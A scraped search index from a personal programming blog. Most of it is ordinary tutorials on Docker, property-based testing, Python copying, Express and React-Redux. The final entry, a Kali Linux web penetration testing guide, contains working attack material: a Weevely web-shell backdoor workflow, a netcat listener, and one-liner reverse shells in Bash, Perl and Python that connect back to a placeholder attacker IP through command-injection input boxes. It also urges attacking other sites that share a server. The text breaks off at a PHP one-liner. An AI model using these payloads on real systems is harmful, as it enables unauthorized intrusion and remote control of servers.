--from=builder /app/build /user/share/nginx/html Note that there is no explicit end to the first stage, this is handled for us whenever a new FROM command is used. Further, the WORKDIR command isn't shared across stages, so be sure to prepend any paths if you want to use data created by different stages. If attempting to run our new image, the default port for nginx is 80 and needs to be mapped to the local PC.","tags":"Software","url":"https://jackmckew.dev/develop-and-deploy-with-docker.html","loc":"https://jackmckew.dev/develop-and-deploy-with-docker.html"},{"title":"Intro to Docker","text":"What is docker? Docker is a platform for running software that is agnostic to the operating system it runs on. This is extremely useful around solving the 'But it works on my machine' problem. This post will go through an intro to docker and how you can use it. A crucial part to Docker is the container, a Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings I did a post back in 2018 on containerization and mentioned Docker too! https://jackmckew.dev/episode-6-containerization.html This post is apart of a series on Docker/Kubernetes, find the other posts at: Develop and Develop with Docker Develop and Develop Multi Container Applications Intro to Kubernetes Developing with Kubernetes Deploying with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker Docker Ecosystem Docker isn't a single program, it's a suite of programs which we'll refer to as an ecosystem. A brief description of all the components that make the ecosystem is: Service Description Docker Client The docker client is how we interact with Docker (eg on the command line) Docker Server The docker server manages running programs inside isolated containers Docker Machine Docker machine lets us install docker engine on virtual hosts (essentially an operating system inside a operation system) Docker Images A docker image is a read-only template of instructions on how to create a docker container Docker Hub Docker hub is a free service provided by Dockeer for finding and sharing container images Docker Compose Docker compose is how we can run multi-container applications. Installing Docker Docker is free to download from along with instructions on installing on your given operating system. https://www.docker.com/products/docker-desktop Maintaining Docker in the Command Line There are many useful commands for interacting with the Docker client. Command Description docker run [container_id/image] Docker run allows us to both create & start a container from either an ID or an image name. If the docker image isn't found on the local PC, it'll attempt to download from Docker Hub docker ps This shows all running containers on the current PC docker ps --all This shows all running & stopped containers on the current PC docker stop [container_id] This stops a running container, if it doesn't stop after 10 seconds, it will kill the container docker kill [container_id] This immediately shuts the container without allowing applications to stop inside the container Dockerfile A Dockerfile is a read-only template with instructions for creating a Docker container/image. It's composed with a series of commands, along with their given arguments. A straightforward example of a Dockerfile is: 1 2 3 4 5 6 7 8 9 # Use an existing docker image as a base FROM alpine # Download and install a dependency RUN apk add --update redis # Tell the the image what to do when it starts # as a container CMD [\"redis-server\"] When we create this Docker image with docker build Dockerfile : We use a base starting point of Alpine (a distribution of Linux), if this isn't found on the local PC, it'll download from Docker Hub We install a program called redis using a pre-installed apk tool We run redis-server inside the container Tagging Images Normally when we run docker build it'll return a container ID, which we'll use to run the container with docker run . Rather than having to copy/paste the container ID each time, we can tag an image with a human-readable name. To do this we can use the -t option for docker build . An example is: docker build -t [docker_id] / [project_name] : [version] So for me to tag an image I'd run: docker build -t jackmckew/my-new-docker-image:latest Dockerfile Which if we wanted to run this image, we can do this now with docker run jackmckew/my-new-docker-image The version is optional to provide, if it isn't provided it will default to latest. Alpine Docker Images Note that we used FROM alpine earlier on in our Dockerfile. alpine is a term used in Docker to represent the most compressed and stripped down version of an image. If we wanted to use a different image like those listed on Docker Hub ( https://hub.docker.com/search?q=&type=image ), we could easily specify to get the alpine version of an image by using FROM node:alpine . Check the description of an image to check whether an alpine version is available. Change Working Directory We can change the working directory inside the container with WORKDIR . This is very useful if we don't want to copy things into the root directory of the container. If a folder isn't found in the argument to WORKDIR , it'll be created automatically. Mounting Files Docker defaults to NOT include any files inside an image from the local PC. We always must mount any files we want to use inside the container in the Dockerfile. One way to do this is using the COPY argument in the Dockerfile. This can be done with: COPY [location_on_local_PC_to_copy] [place_to_story] An example of this is: COPY ./ ./ , this will copy the current folder relative to where the terminal is, and places it in the current working directory inside the container. Port Mapping By default no traffic will be routed into a container, meaning a container has it's own set of ports that are not connected to the local PC. Thus we need to set up a mapping between the local PC and the containers ports. This is not changed within the Dockerfile, but rather when we run the container with the -p flag. This can be done with: 1 docker run -p [ local_pc_port ] : [ container_port ] [ image_name ] By default there is no limitation on default traffic getting out of a container, only limitations on traffic getting in. This local PC port and the container port do NOT have to match. Docker Compose Docker compose is a separate tool apart of the Docker CLI, this is used to start up multiple containers at the same time. This helps automate the arguments that would be need to connect multiple containers to talk to each other. We need to create docker-compose.yml files that we can feed into the docker compose CLI, this is essentially replacing the arguments that we've been typing into the Docker CLI previously. Here's an example of a docker-compose.yml which will: Create an container that will host a redis server Create an container that will host a nodejs app Network the ports of the nodejs app container 1 2 3 4 5 6 7 8 version : \"3\" services : redis-server : image : \"redis\" node-app : build : . ports : - \"8000:8000\" Let's break it down, first we specify the version of docker-compose to run on. Following that under services, each container that we want to run is indented and then named. Inside the service declaration we can either specify an image to use, or whether to use docker build to build a Dockerfile (note this will look in the current directory for a Dockerfile). Finally mapping port 8000 of the local PC to port 8000 of the docker container. By using docker-compose, this also automates that the docker containers run on the same network. This would be a major pain to do without using docker-compose. Once we've created a docker-compose.yml , we can run this by running the command docker-compose up inside the same directory. We can also specify that we want to rebuild all the images inside the docker-compose.yml file with --build , so the new command becomes docker-compose up --build . Stopping Docker Compose Rather than using docker stop with each of the IDs of the containers that we created. Luckily, we can simply run docker-compose down to stop all the containers after using docker-compose up . This is particularly useful when we run docker-compose up -d which will run the containers in the background, so we can't just CTRL+C out of it. Restart Policies If any container crashes, docker-compose defaults to the restart policy of \"no\" , which never attempts to restart the container. Potential restart policies in docker-compose are: Policy Description \"no\" Never restart a container on stop/crash always If a container stops for any reason at all, attempt to restart on-failure Only restart if a container stops with an error unless-stopped Always restart unless forcibly stopped The restart policy is defined along with other arguments under the service name. Check Docker Compose Status Similarly to running docker ps , we can run docker-compose ps to check all the running containers that we started with docker-compose up . This must be used in the same directory as the docker-compose.yml file.","tags":"Software","url":"https://jackmckew.dev/intro-to-docker.html","loc":"https://jackmckew.dev/intro-to-docker.html"},{"title":"Property Based Testing in Python","text":"Building software can be challenging, but maintaining it after that initial build can be even moreso. Being able to test the software such that it verifies the software behaves as expected is crucial in building robust software applications that users depend upon, being able to automate this testing is even better! There's other blog posts on this blog around the topic of testing Introduction to Pytest & Pipenv , but for this post we're going to focus on a very specific type of testing, property based testing . Property based testing differs itself from the conventional example based testing by being able to generate the test data that drives your tests, and even better, can help find the boundaries of where the tests fail. To demonstrate the power of property based testing, we're going to build some testing for the old faithful multiplication operator in Python. To help with this, we are going to use a few packages: pytest (testing framework) hypothesis (property testing package) ipytest (to enable running tests in jupyter notebooks) Before we dive in, let's set up ipytest and use some example-based testing to verify the multiplication operator. In [5]: import ipytest import pytest ipytest . autoconfig () def multiply ( number_1 , number_2 ): return number_1 * number_2 In [6]: %% run_pytest [clean] def test_example(): assert multiply(3,3) == 9 assert multiply(5,5) == 25 assert multiply(4,6) == 24 . [100%] 1 passed in 0.02s Fantastic, our examples passed the test! Now let's ensure that the test fails. In [7]: %% run_pytest [clean] def test_fail_example(): assert multiply(3,3) == 9 assert multiply(3,5) == 150 F [100%] ================================== FAILURES =================================== ______________________________ test_fail_example ______________________________ def test_fail_example(): assert multiply(3,3) == 9 > assert multiply(3,5) == 150 E assert 15 == 150 E + where 15 = multiply(3, 5) <ipython-input-7-212df0aaa8ed>:3: AssertionError =========================== short test summary info =========================== FAILED tmpg6kq2sek.py::test_fail_example - assert 15 == 150 1 failed in 0.34s Perfect! We can see that the test fails as expected and even nicely tells us which line of code it failed on. Let's say we had lots of these examples that we wanted to test for, so to simplify it we could potentially use pytest's parametrize decorator. In [8]: %% run_pytest [clean] @pytest.mark.parametrize('number_1, number_2 , expected', [ (3,3,9), (5,5,25), (4,6,24) ]) def test_multiply(number_1,number_2,expected): assert expected == multiply(number_1,number_2) ... [100%] 3 passed in 0.02s Is this enough testing to verify our function? Really, we're only testing a few conditions that we'd expect to work, but in reality it's the ones that nobody foresees that would be ideal to capture in our tests. This also raises a few more things, the developer writing the tests may choose to write 2 or 2000 test cases but this doesn't guarantee anything when it comes to if it's truly covered. Introduce Property Based Testing Property based testing is considered as generative testing, we don't supply specific examples with inputs and expected outputs. Rather we define certain properties and generate randomized inputs to ensure the properties are correct. In addition to this, property based testing can also shrink outputs to find the exact boundary condition where a test fails. While this doesn't 100% replace example-based testing, they definitely have their use and have a lot of potential for effective testing. Now let's implement the same tests above, using property based testing with hypothesis . In [9]: from hypothesis import given import hypothesis.strategies as st In [10]: %% run_pytest [clean] @given(st.integers(),st.integers()) def test_multiply(number_1,number_2): assert multiply(number_1,number_2) == number_1 * number_2 . [100%] 1 passed in 0.14s Note that we've used the given decorator which makes our test parametrized, and use strategies which cover the types of input data to generate. As per the hypothesis documentation Most things should be easy to generate and everything should be possible , we can find more information on them here: https://hypothesis.readthedocs.io/en/latest/data.html Now this doesn't look any different to last time, so what even changed! Let's change our multiply function so it behaves strangely and see if we can see hypothesis shrink the failures in action. Shrinking is whenever it finds a failure, it'll try to get to the absolute boundary case to help us find the potential cause and even better it'll remember this failure for next time so it doesn't poke it's head up again! In [15]: def bad_multiply ( number_1 , number_2 ): if number_1 > 30 : return 0 if number_2 < 0 : return 0 return number_1 * number_2 In [16]: %% run_pytest [clean] @given(st.integers(),st.integers()) def test_bad_multiply(number_1,number_2): assert bad_multiply(number_1,number_2) == number_1 * number_2 F [100%] ================================== FAILURES =================================== ______________________________ test_bad_multiply ______________________________ @given(st.integers(),st.integers()) > def test_bad_multiply(number_1,number_2): <ipython-input-16-3e2ec463c8ad>:2: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ number_1 = 31, number_2 = 1 @given(st.integers(),st.integers()) def test_bad_multiply(number_1,number_2): > assert bad_multiply(number_1,number_2) == number_1 * number_2 E assert 0 == (31 * 1) E + where 0 = bad_multiply(31, 1) <ipython-input-16-3e2ec463c8ad>:3: AssertionError --------------------------------- Hypothesis ---------------------------------- Falsifying example: test_bad_multiply( number_1=31, number_2=1, ) =========================== short test summary info =========================== FAILED tmp8uis7_kv.py::test_bad_multiply - assert 0 == (31 * 1) 1 failed in 0.22s Fantastic, we can see that the failure has been shrunken to number_1 being 31 and number_2 being 1 which is one integer off the 'bad' boundary conditions we'd introduced into the multiply function. Hopefully this has introduced the power of property based testing and can help make software more robust for everyone!","tags":"Python","url":"https://jackmckew.dev/property-based-testing-in-python.html","loc":"https://jackmckew.dev/property-based-testing-in-python.html"},{"title":"Shallow vs Deep Copy in Python","text":"Shallow vs Deep Copy in Python One of the utmost crucial parts in all programming languages is maintaining variables. We create, modify, compare, delete our variables to build more complex systems that eventually make up the software we use. This is typically done by using the = operator (eg x = 5 ), but sometimes this doesn't always do what we expect. This is going to be a deep dive into different types of copy in Python. When we say x = 5 , we're actually not creating a new object (as in object oriented software), we're creating a binding between a target and an object. We can see this in action by using the id() function on our variables to see the 'identity' of an object. In [1]: x = 5 print ( id ( x )) print ( id ( 5 )) 140711684720416 140711684720416 As we can see, both x and 5 share an 'identity' meaning they are both the same object and the variable is merely a 'pointer' to the right object. But sometimes we actually want to create a new object, and this comes into using the copy module. But even with copy there's still 2 types of copy: shallow copy deep copy Let's take a look at this a bit closer, we'll start by creating a list (an object itself), with some integer elements and an embedded list. In [2]: A = [ 1 , 2 ,[ 3 , 4 ], 5 ] print ( \"A contents: \" , A ) A contents: [1, 2, [3, 4], 5] Now similar to our x = 5 example before, let's assign a new variable B and set it to A to see what happens to the identities. In [3]: B = A print ( f \"A's object id is { id ( A ) } \" ) print ( f \"B's object id is { id ( B ) } \" ) A's object id is 2392779886784 B's object id is 2392779886784 Funnily enough, the ids are the same! Meaning they are both the same object. This would mean if we were to modify the contents of the elements in A , the same modifications would be made in B , which is not obvious. In [4]: print ( \"Let's modify A[2][0] = 100\" ) A [ 2 ][ 0 ] = 100 print ( \"A contents: \" , A ) print ( \"B contents: \" , B ) print ( \"Is A == B? \" , A == B ) Let's modify A[2][0] = 100 A contents: [1, 2, [100, 4], 5] B contents: [1, 2, [100, 4], 5] Is A == B? True Now if we were trying to use B as a separate entity to A this could cause all sorts of grief, and be very difficult to track down. Let's reset our variable(s) back to it's original state so we can see how shallow & deep copies could change this behaviour. In [5]: print ( \"Let's reset A[2][0] = 3\" ) A [ 2 ][ 0 ] = 3 Let's reset A[2][0] = 3 Shallow Copy In [6]: import copy C = copy . copy ( A ) print ( f \"A's object id is { id ( A ) } \" ) print ( f \"C's object id is { id ( C ) } \" ) A's object id is 2392779886784 C's object id is 2392779896256 Fantastic! Now we can see that our A and C have separate identities, now we would expect this to behave like separate entities, right? Unfortunately not, while this does have a use case, the contents inside the list still have matching identities, meaning if we modify the contents of C , it'll be reflected in A , again a not obvious behaviour. But this is known as a shallow copy, meaning a new object is created but it still references the original data. Let's demonstrate this by modifying one of the elements, and seeing if it's reflected in both variables. In [7]: print ( f \"A[2][0]'s object id is { id ( A [ 2 ][ 0 ]) } \" ) print ( f \"C[2][0]'s object id is { id ( C [ 2 ][ 0 ]) } \" ) print ( \"Let's modify C[2][0] = 100 (note if this was not an embedded list this will creates a new instance of the C[0] element and won't update original list)\" ) C [ 2 ][ 0 ] = 100 print ( \"A contents: \" , A ) print ( \"C contents: \" , C ) print ( \"Is A == C? \" , A == C ) print ( \"Is A[2][0] == C[2][0]? \" , A [ 0 ] == C [ 0 ]) A[2][0]'s object id is 140711684720352 C[2][0]'s object id is 140711684720352 Let's modify C[2][0] = 100 (note if this was not an embedded list this will creates a new instance of the C[0] element and won't update original list) A contents: [1, 2, [100, 4], 5] C contents: [1, 2, [100, 4], 5] Is A == C? True Is A[2][0] == C[2][0]? True But why are we using an embedded list specifically? This is one percularity, that like most things in this blog post, isn't obvious. Note that if we modified the contents of an element in the shallow copy that was an integer, it wou;dn't be reflected in both variables. Let's try this out. In [8]: print ( f \"A[1]'s object id is { id ( A [ 1 ]) } \" ) print ( f \"C[1]'s object id is { id ( C [ 1 ]) } \" ) print ( \"Let's modify C[1] = 100\" ) C [ 1 ] = 100 print ( \"A contents: \" , A ) print ( \"C contents: \" , C ) print ( \"Is A == C? \" , A == C ) print ( \"Is A[1] == C[1]? \" , A [ 1 ] == C [ 1 ]) A[1]'s object id is 140711684720320 C[1]'s object id is 140711684720320 Let's modify C[1] = 100 A contents: [1, 2, [100, 4], 5] C contents: [1, 100, [100, 4], 5] Is A == C? False Is A[1] == C[1]? False This is due to the fact that the only difference between shallow and deep copies is for compound objects (objects that contain other objects, like lists within lists). Next let's reset our list, and take a look at deep copy. In [9]: print ( \"Let's reset A[2][0] = 3 and A[1] = 2\" ) A [ 1 ] = 2 A [ 2 ][ 0 ] = 3 Let's reset A[2][0] = 3 and A[1] = 2 Deep Copy Now we're at the deep copy, and as we'd expect it creates a completely new object, and recursively creates new objects for embedded objects (compound objects). This means when we edit anything inside one of these compound objects, the changes won't be reflected in the other object as we'd sometimes originally expect. Let's demonstrate this. In [10]: print ( \"Let's do a deep copy\" ) D = copy . deepcopy ( A ) print ( f \"A's object id is { id ( A ) } \" ) print ( f \"D's object id is { id ( D ) } \" ) print ( \"Let's modify A[2][0] = 100\" ) A [ 2 ][ 0 ] = 100 print ( A ) print ( D ) Let's do a deep copy A's object id is 2392779886784 D's object id is 2392779846656 Let's modify A[2][0] = 100 [1, 2, [100, 4], 5] [1, 2, [3, 4], 5] Hopefully being aware of how the default behaviour works, and the potential solutions will help when debugging strange behaviour when using variables in Python!","tags":"Data Science","url":"https://jackmckew.dev/shallow-vs-deep-copy-in-python.html","loc":"https://jackmckew.dev/shallow-vs-deep-copy-in-python.html"},{"title":"API Routes in Node.js","text":"First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post will dive into how to set up API routes in Nodejs with express. We start by 'importing' express into our route and instantiating a router from the express library. 1 2 const express = require ( 'express' ); const router = express . Router (); Typically we group API routes together in standalone javascript files. For example, if our application needed authentication for users logging in, we could create an auth.js file which will contain all the API routes to do with authentication. We need to import express and instantiate the router in each of the standalone javascript files. Next we can create routes as straightforward as using the corresponding method within router . Pending on the type of API that is being created, if you are using Express.js, it's mostly likely a web API and thus the methods follow HTTP method routes. The primary or most-commonly-used HTTP methods are: Method Name Operation Description POST Create Used for creating a new record of information GET Read Used for retrieving information PUT Update Used for updating existing information DELETE Delete Used for deleting information These 4 methods make up the basic CRUD functionality (Create, Read, Update and Delete) of an application. POST Let's create a scaffold POST method in node.js. 1 2 3 router . post ( '/' , function ( req , res ) { res . send ( 'POST request to homepage' ); }) Similarly to do this asynchronously with arrow functions: 1 2 3 router . post ( '/' , async ( req , res ) => { res . send ( 'POST request to homepage' ); }) As we can see above, the first argument to our API route method is the path, and the following is the callback function (what should happen when this path is hit). The callback function can be a function, array of functions, series of functions (separated by commas), or a combination of all of them. This is useful if you are wanting to do validation before the final POST request is made. An example of this is: 1 2 3 router . post ( '/' ,[ checkInputs ()], async ( req , res ) => { res . send ( 'POST request to homepage and inputs are valid' ); }) GET All the methods within Express.js follow the same principles so to create a scaffold GET request: 1 2 3 router . get ( '/' , async ( req , res ) => { res . send ( 'GET request to homepage' ); }) PUT Similarly: 1 2 3 router . put ( '/' , async ( req , res ) => { res . send ( 'PUT request to homepage' ); }) DELETE Similarly: 1 2 3 router . delete ( '/' , async ( req , res ) => { res . send ( 'PUT request to homepage' ); }) Express Middleware All of the callback functions defined above are known as Middleware functions in Express.js. Middleware functions have access to 3 elements: req , res , and next . Argument Use req HTTP request, named req by convention res HTTP response, named res by convention next The next middleware function to be called An example of using all of the arguments is: 1 2 3 4 5 router . get ( '/' , async ( req , res , next ) => { console . log ( req . body ); res . send ( 'GET request to homepage' ); next (); }) By piecing together many of these API routes (also known as endpoints) we can build a functional API that can drive our applications. For example, the application in the end may make a GET request to get all the latest posts by other users, and makes a POST request when you add a new post, and so on with all the different types of API routes.","tags":"Javascript","url":"https://jackmckew.dev/api-routes-in-nodejs.html","loc":"https://jackmckew.dev/api-routes-in-nodejs.html"},{"title":"Actions and Reducers in React-Redux","text":"Redux is a predictable state container for JavaScript applications , and React is a JavaScript library for building user interfaces . To bridge the two, you get react-redux which allows our user interfaces to interact & respond to the current state of the application. In this post let's go into actions and reducers. First off, what is an action and what is a reducer in this context? Actions are payloads of information that send data from the application to the redux store. Reducers specify how the application's state changes in response to actions sent to the store. It is summarized in the graphic: Let's use react-redux to build a system which we can alert users when things trigger. For this we will need to build an action, a reducer and a component to display the alert. To ensure that these three components are speaking the same language, we need to initialise types which will represent the states being passed around. These variables contain a string. For our alert system we need two variables 1 2 export const SET_ALERT = \"SET_ALERT\" export const REMOVE_ALERT = \"REMOVE_ALERT\" Action We'll start by creating the action which will signify when an alert is triggered. We want all of our alerts to be unique so multiple alerts can handled without a problem which we will use uuid . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { v4 as uuid } from \"uuid\" ; import { SET_ALERT , REMOVE_ALERT } from \"../actions/types.jsx\" ; export const setAlert = ( msg , alertType , timeout = 5000 ) => ( dispatch ) => { const id = uuid (); dispatch ({ type : SET_ALERT , payload : { msg , alertType , id }, }); setTimeout ( () => dispatch ({ type : REMOVE_ALERT , payload : id , }), timeout ); }; The action is declared as a function, which takes in 3 arguments (2 required): msg , alertType and timeout . Which we then use call the dispatch function with an object constructed from the arguments, and then after a specified timeout we dispatch another object to remove the same alert. Note that we curry the dispatch function in this case, this is only possible from using the middleware redux-thunk , which can also be represented as: 1 2 3 4 5 function setAlert ( msg , alertType , timeout = 5000 ) { return function ( dispatch ){ dispatch ({ type : ACTION_TYPE }) } } There is a much more fleshed out answer to how the currying works out in the end over at: https://stackoverflow.com/questions/35411423/how-to-dispatch-a-redux-action-with-a-timeout/35415559#35415559 . Component We need to be able to somehow show the alert on the page to the user. There is a very little chance that the user will sit in the console and monitor the state of a redux component changing (for which the Redux Devtools Extension is useful). Let's display the alert as a div , with colouring to match the type. This post won't go into detail around how to build a React component, which you can find over at another post: [INSERT REACT COMPONENT POST] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import React from \"react\" ; import PropTypes from \"prop-types\" ; import { connect } from \"react-redux\" ; const Alert = ({ alerts }) => alerts !== null && alerts . length > 0 && alerts . map (( alert ) => ( < div key = { alert . id } className = { `alert alert- ${ alert . alertType } ` } > { alert . msg } < /div> )); Alert . propTypes = { alerts : PropTypes . array . isRequired , }; const mapStateToProps = ( state ) => ({ alerts : state . alert , }); export default connect ( mapStateToProps )( Alert ); To break it down, we've created a React component (class) Alert which takes in alerts as an array, verifies it isn't null or empty, and finally iterates over each element in the alerts array to return a div stylized with the appropriate information. Reducer Lastly we have the reducer which we want to handle all the states that can be created by the alert action. Luckily we can do this with a switch statement: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import { SET_ALERT , REMOVE_ALERT } from \"../actions/types.jsx\" ; const initialState = []; export default function ( state = initialState , action ) { const { type , payload } = action ; switch ( type ) { case SET_ALERT : return [... state , payload ]; case REMOVE_ALERT : return state . filter (( alert ) => alert . id !== payload ); default : return state ; } } We define a function that takes in a state, and an action to act upon. We deconstruct the type and payload from the action to make things more readable. Now that we can switch across the different action types we do the following. Set Alert Action If a SET_ALERT action is dispatched from our action we defined earlier, our reducer needs to update the relevant component which we also defined earlier. As such we return an array (which will become the alerts array) which contains the updated state of the application (using the spread operation to deconstruct the state object and concatenate it with the payload). Remove Alert Action For this action type, we return a filtered array containing all the alerts except the id that was identified in the payload. Default If neither setting or removing an alert, don't change the state at all. Conclusion Using react-redux we can create a responsive web application which enhances the user experience!","tags":"Javascript","url":"https://jackmckew.dev/actions-and-reducers-in-react-redux.html","loc":"https://jackmckew.dev/actions-and-reducers-in-react-redux.html"},{"title":"Components in React.js","text":"To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear. In this post let's break down the general structure of a React component. More specifically this will also include using react-redux for state management in the browser and react-router-dom for handling dynamic routing. These can both be installed through npm . Let's try to building a component which will represent a landing page on our React app with create-react-app . We will also want to show a different page whether the user is logged in or not, so our Landing component will take an input of (aka prop) of isAuthenticated . We won't be going into how the interface in App.s is created nor how isAuthenticated is handled outside the component in this post. Let's create a file Landing.js (similarly could be named Landing.jsx for react specific file extension, Landing.ts for TypeScript or Landing.tsx for both react specific extension with TypeScript). This is followed by by importing all the necessary requirements for our javascript file. Import Requirements 1 2 3 4 import React from \"react\" ; import { Link , Redirect } from \"react-router-dom\" ; import { connect } from \"react-redux\" ; import PropTypes from \"prop-types\" ; The first line is to import React library, while this isn't used explicitly in the remaining code we will write, it will not work without it. This is due to when the code is transpiled into JavaScript, it'll then used React directly with React.createElement() . Next up is Link and Redirect , note the curly braces around these, this is known as destructuring, meaning we only want to take the two classes from the library. This method is useful for making more readable code when dealing with objects. Link is react-router-dom 's class for creating anchor tags (aka <a/> in HTML), and similarly Redirect is as you'd expect, a class to dynamically redirect to another route. connect is a function that connects a React component to a Redux store. Consider a redux store as the immutable (can't be changed after creation) state of the application. The only way to change the state of the store is to dispatch an action, which is typically handled by a reducer. PropTypes is a way of implementing runtime type checking for React props. If TypeScript is used for the project, this is somewhat extra type checking, which we can never have enough of! The Component Now that we've imported everything that we need, it's time to actually create the component! A component in React is a function, where the props are the inputs and the element to be rendered is the return statement. We do this with an arrow function (aka Lambda function) for clarity. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const Landing = ({ isAuthenticated }) => { if ( isAuthenticated ){ return < Redirect to = \"/user-profile\" /> } return ( < div className = \"homepage\" > < h1 className = \"site-title\" > An Awesome Landing Page < /h1> < div className = \"buttons\" > < Link to = \"/register\" > Sign Up < /Link> < Link to = \"/login\" > Log In < /Link> < /div> < /div> ) } Landing . propTypes = { isAuthenticated : PropTypes . bool , } const signifies our function is immutable, in that it can't be changed after it's been created. Next we deconstruct the argument of isAuthenticated from the function argument as we are expecting the function to be called with an object. If the user is logged in, then redirect them to their profile and if not, return a HTML div which contains all the elements as required. Note that className is used over class to denote CSS mark up as in JavaScript class is a keyword which can lead to unwanted behaviour. Following this we add an object to our function which denotes the types of the arguments which should be expected in the function call. If we wanted to ensure that isAuthenticated is always passed, this is done by using the isRequired property, resulting in: isAuthenticated: PropTypes.bool.isRequired . Prop Types & Connect Lastly we must define how our component is to interact with the redux store and export the function such that it can be used in other files. Since the component is dependant on what the state of the application is, we need to create a function which will map the state to the relevant prop, which we aptly name mapStateToProps . This post is not intended to go through how to set up the redux store or interactions with it. 1 2 3 4 5 const mapStateToProps = ( state ) => ({ isAuthenticated : state . auth . isAuthenticated , }) export default connect ( mapStateToProps )( Landing ) mapStateToProps is a function that takes in the current state of the application, and deconstructs the relevant element to use. connect is a wrapper function (aka curried function), so when it's called with connect(mapStateToProps) it returns another function which we can then use to pass our component into. Conclusion Now we can use the statement import Landing from './Landing' and use our component similar to that of Link in our app! The full source of Landing.js is: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import React from \"react\" ; import { Link , Redirect } from \"react-router-dom\" ; import { connect } from \"react-redux\" ; import PropTypes from \"prop-types\" ; const Landing = ({ isAuthenticated }) => { if ( isAuthenticated ){ return < Redirect to = \"/user-profile\" /> } return ( < div className = \"homepage\" > < h1 className = \"site-title\" > An Awesome Landing Page < /h1> < div className = \"buttons\" > < Link to = \"/register\" > Sign Up < /Link> < Link to = \"/login\" > Log In < /Link> < /div> < /div> ) } Landing . propTypes = { isAuthenticated : PropTypes . bool , } const mapStateToProps = ( state ) => ({ isAuthenticated : state . auth . isAuthenticated , }) export default connect ( mapStateToProps )( Landing )","tags":"Javascript","url":"https://jackmckew.dev/components-in-reactjs.html","loc":"https://jackmckew.dev/components-in-reactjs.html"},{"title":"Web Penetration Testing with Kali Linux","text":"This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? \"Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing\". Kali Linux is free to download and you can find it at: https://www.kali.org/downloads/ . This post is apart of a series of posts, see the other posts at: Network Hacking with Kali Linux Gaining Access with Kali Linux Thank you to Chris B for helping me with the notes in this post below! Thank you to Sarah H who shared a neat cheat sheet which can be found at: https://www.comparitech.com/net-admin/kali-linux-cheat-sheet/ Web Information Gathering Discovering Subdomains Discovering Sensitive Files Exploiting Server Vulnerabilities Exploiting File Upload Vulnerabilities to Gain Access Exploiting Code Execution Vulnerabilities Bash PERL Python PHP Ruby Netcat Local File Inclusion Remote File Inclusion Prevention of Web Server Exploits SQL Injection and Attacks Discovering SQL Injections with Form Submissions (POST) Bypassing Logins via Injections Discovering SQL Injections in Data Retrieval (GET) Read and Writing Files on the Server via SQL. Reading Writing Use SQLmap to do the Above and More Prevention of SQL Vulnerabilities CROSS SITE SCRIPTING(XSS) Prevention of XSS Vulnerabilities To Automatically Discover Web Vulnerabilities Web Information Gathering As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack. Some helpful tools for learning information about websites are: http://whois.domaintools.com/ Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering. https://sitereport.netcraft.com/ Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in languages that the server can understand). https://www.exploit-db.com/ Database of exploits, make sure versions match. https://www.robtex.com/ Comprehensive DNS information. Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search ip:[target_ip] . Discovering Subdomains Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found https://github.com/guelfoweb/knock . git clone <https://github.com/guelfoweb/knock.git> cd into the folder. run it using, python knock.py [target] if doesn't work try running the above with --resolve , then run the above again. Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas. Discovering Sensitive Files Use dirb (use man dirb for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response). dirb [target] [wordlist] [options] a / usually means you are in a directory. phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see. Exploiting Server Vulnerabilities The following are a series of ways to exploit web servers for different outcomes. Exploiting File Upload Vulnerabilities to Gain Access Using a tool called Weevely . Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server. weevly generate [password] [path+filename] - create backdoor upload the file. weevly [url_to_file] - connect to the file help - help Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload. Exploiting Code Execution Vulnerabilities Always experiment with any input boxes you see, as they are executing a command, you might be able to change the command. Can use && or ; in unix to execute multiple commands in one line. Test if input box allows this. Most servers have python and netcat. Listen for incoming connections, example using netcat: netcat -vv -l -p [port] - listens for connections on port 8080 ie. nc -e /bin/sh [ip] [port] - netcat connection. Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by [HOST_IP] and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes. Bash 1 bash -i > & /dev/tcp/ [ HOST_IP ] /8080 0 > & 1 PERL 1 perl - e 'use Socket;$i=\"[HOST_IP]\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Python 1 python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[HOST_IP]\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' PHP 1 php -r 